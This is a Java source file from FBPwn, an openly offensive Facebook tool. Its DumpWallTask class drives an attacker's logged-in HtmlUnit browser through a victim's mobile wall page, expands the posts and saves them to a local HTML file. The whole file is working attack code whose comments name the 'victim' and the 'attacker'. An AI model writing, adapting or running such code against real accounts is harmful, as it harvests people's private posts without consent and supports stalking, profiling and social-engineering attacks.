/*
 * FBPwn
 * 
 * http://code.google.com/p/fbpwn
 * 
 * Copyright (C) 2011 - FBPwn
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package fbpwn.plugins.core;

import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlAnchor;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import fbpwn.core.AuthenticatedAccount;
import fbpwn.core.FacebookAccount;
import fbpwn.core.FacebookTask;
import fbpwn.core.FacebookTaskState;
import fbpwn.plugins.ui.DumpWallDialog;
import fbpwn.ui.FacebookGUI;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.InvocationTargetException;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.SwingUtilities;

public class DumpWallTask extends FacebookTask {

    private int wallPagesNumber;

    /**
     * Creates a wall dumper task
     *
     * @param FacebookGUI The GUI used for updating the task's progress
     * @param facebookProfile The victim's profile
     * @param authenticatedProfile The attacker's profile
     * @param workingDirectory The directory used to save all the dumped data
     */
    public DumpWallTask(FacebookGUI FacebookGUI,
            FacebookAccount facebookProfile,
            AuthenticatedAccount authenticatedProfile,
            File workingDirectory) {
        super(FacebookGUI, facebookProfile, authenticatedProfile, workingDirectory);
    }

    @Override
    public boolean run() {
        try {
            setMessage("Initiating Module");
            setTaskState(FacebookTaskState.Running);
            getFacebookGUI().updateTaskProgress(this);

            String MobileWallPage = getFacebookTargetProfile().getProfilePageURL().replace("www", "m");
            WebClient tempWebClient = getAuthenticatedProfile().getBrowser();

            //opening mobile wall page
            HtmlPage VictimWallPage = tempWebClient.getPage(MobileWallPage);
            //checking for accessible wal page
            if (VictimWallPage.asXml().contains("m_stream_stories")) {
                //determining number of pages to be dumped
                try {
                    SwingUtilities.invokeAndWait(new Runnable() {

                        @Override
                        public void run() {
                            DumpWallDialog dialog = new DumpWallDialog(null, true);
                            wallPagesNumber = dialog.ShowWallPagesSelectionDialog();
                        }
                    });
                } catch (InterruptedException ex) {
                    Logger.getLogger(AddVictimsFriends.class.getName()).log(Level.SEVERE, "Exception in thread: " + Thread.currentThread().getName(), ex);
                } catch (InvocationTargetException ex) {
                    Logger.getLogger(AddVictimsFriends.class.getName()).log(Level.SEVERE, "Exception in thread: " + Thread.currentThread().getName(), ex);
                }
                if (checkForCancel()) {
                    return true;
                }
                //dumping wall pages
                PrintWriter wallWriter = new PrintWriter(new File(getDirectory().getAbsolutePath() + System.getProperty("file.separator") + "Wall.html"), "UTF-8");
                setMessage("Dumping Wall posts");
                setPercentage(0.0);
                getFacebookGUI().updateTaskProgress(this);
                wallWriter.println("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
                wallWriter.println("<!DOCTYPE html PUBLIC \"-//WAPFORUM//DTD XHTML Mobile 1.0//EN\" \"http://www.wapforum.org/DTD/xhtml-mobile10.dtd\">");
                wallWriter.println(VictimWallPage.getElementsByTagName("head").get(0).asXml());
                int index = 0;
                while (index != wallPagesNumber) {

                  
                    try {
                          //Expand and dump "See more" wall posts
                        List<HtmlAnchor> anchors = VictimWallPage.getAnchors();
                        for (HtmlAnchor anchor : anchors) {
                            if (anchor.getTextContent().equals("See More")) {
                                HtmlPage click = anchor.click();

                                try {
                                    wallWriter.print(click.getElementById("root").asXml());
                                    wallWriter.println("<hr>");
                                } catch (Exception ex) {
                                    // Will occur if element is not found
                                    // Exception is Safe to ignore
                                }
                            }
                        }
                    } catch (Exception ex) {
                        // Will occur if failed to get an anchor with see more
                        // Exception is Safe to ignore
                    }

                    // Dump whole pages
                    try {
                        wallWriter.print(VictimWallPage.getElementById("m_stream_stories").asXml().replace("See More Posts", "Page " + (index + 1)));
                    } catch (Exception ex) {
                        // Will occur if element is not found
                        // Exception is Safe to ignore
                    }
                    wallWriter.println("<hr>");
                    try {
                        wallWriter.print(VictimWallPage.getElementById("structured_composer_async_container").asXml().replace("See More Posts", "Page " + (index + 1)));
                    } catch (Exception ex) {
                        // Will occur if element is not found
                        // Exception is Safe to ignore
                    }


                    wallWriter.println("<hr>");
                    try {
                        VictimWallPage = VictimWallPage.getAnchorByText("See More Posts").click();
                    } catch (Exception ex) {
                        break;
                    }

                    setMessage("Dumped " + (index + 1) + "/"
                            + (wallPagesNumber == -1 ? "all" : wallPagesNumber)
                            + " Wall page(s)");

                    if (wallPagesNumber != -1) {
                        setPercentage(((double) (index + 1) / wallPagesNumber) * 100);
                    }

                    getFacebookGUI().updateTaskProgress(this);
                    wallWriter.flush();
                    if (checkForCancel()) {
                        wallWriter.close();
                        return true;
                    }
                    index++;
                }
                wallWriter.flush();
                wallWriter.close();
                setMessage("Finished");
                setPercentage(100.0);
                setTaskState(FacebookTaskState.Finished);
                getFacebookGUI().updateTaskProgress(this);
            } else {
                setMessage("Victim's wall page is not Accesible");
                setPercentage(100.0);
                setTaskState(FacebookTaskState.Finished);
                getFacebookGUI().updateTaskProgress(this);
            }
        } catch (IOException ex) {
            Logger.getLogger(DumpWallTask.class.getName()).log(Level.SEVERE, "Exception in thread: " + Thread.currentThread().getName(), ex);
            return false;
        } catch (FailingHttpStatusCodeException ex) {
            Logger.getLogger(DumpWallTask.class.getName()).log(Level.SEVERE, "Exception in thread: " + Thread.currentThread().getName(), ex);
            return false;
        }
        return true;
    }

    @Override
    public void init() {
    }

    @Override
    public String toString() {
        return "Dump Victim wall posts";
    }
}
